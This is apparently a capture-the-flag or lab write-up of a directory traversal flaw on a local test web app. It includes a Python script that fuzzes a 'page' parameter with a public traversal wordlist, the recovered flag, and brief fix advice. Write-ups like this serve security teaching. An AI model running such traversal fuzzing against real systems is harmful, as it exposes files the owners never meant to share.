# Directory traversal

### Breach description

We accessed sensitive directories that are supposed to be out of reach for the user. The exploit is based on using “../” to get to parent directories.

```python
import requests

# Target URL
base_url = "http://192.168.64.6/?page="

# Function to test directory traversal
def test_directory_traversal(payload):
    url = base_url + payload
    response = requests.get(url)
    # Check if response contains any indication of successful traversal
    if "flag" in response.text:
        print(f"Possible directory traversal found: {payload}")
        print(url)

# Load common directory traversal payloads from file
with open("traversal_common.txt", "r") as file:
    payloads = file.read().splitlines()

# Iterate through payloads and test directory traversal
for payload in payloads:
    test_directory_traversal(payload)
```

[List](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt) used in traversal_common.txt file.

Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

### Explanation of the breach

Access to out of scope directories of the web app because the authorization policy has not been implemented properly or not at all.

The script above traverses common directories that are know for holding sensitive information.

### Breach Fix

Enforce appropriate permissions on directories and files.out of the web root.

Process the URI requests.

[https://github.com/maverickNerd/wordlists/blob/master/fuzz/linux_lfi.txt](https://github.com/maverickNerd/wordlists/blob/master/fuzz/linux_lfi.txt)